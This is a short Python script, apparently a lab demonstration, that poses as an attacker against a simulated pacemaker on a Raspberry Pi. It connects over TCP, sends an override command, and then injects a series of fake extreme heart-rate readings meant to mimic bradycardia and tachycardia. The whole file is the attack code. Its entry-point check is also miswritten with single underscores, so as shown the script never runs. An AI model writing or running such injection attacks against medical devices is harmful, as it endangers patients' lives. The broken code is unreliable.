import socket
import time
import random
from datetime import datetime

PACEMAKER_IP = "10.179.212.7"  # Raspberry Pi IP
PACEMAKER_PORT = 7777

def log(msg):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    print(f"{timestamp} [Attacker] {msg}")

def generate_fake_bpm():
    # Extreme values to simulate dangerous conditions
    return random.choice([2, 10, 11, 200, 190])

def main():
    try:
        sock = socket.socket()
        sock.connect((PACEMAKER_IP, PACEMAKER_PORT))
        log("Connected to pacemaker.")

        # Enable override
        sock.sendall(b"OVERRIDE_ON\n")
        log("Override activated (Pacemaker will trust attacker)")

        # Send malicious BPMs repeatedly
        for _ in range(20):  # You can adjust the number of packets
            bpm = generate_fake_bpm()
            status = "Simulated Bradycardia" if bpm < 50 else "Simulated Tachycardia"
            message = f"Heartbeat: {bpm} bpm | Status: {status}"
            sock.sendall((message + "\n").encode())
            log(f"Sent: {message}")
            time.sleep(2)

        # Disable override (optional)
        sock.sendall(b"OVERRIDE_OFF\n")
        log("Override deactivated (Pacemaker will resume normal behavior)")

    except Exception as e:
        log(f"Error: {e}")
    finally:
        try:
            sock.close()
        except:
            pass
        log("Disconnected.")

if _name_ == "_main_":
    main()
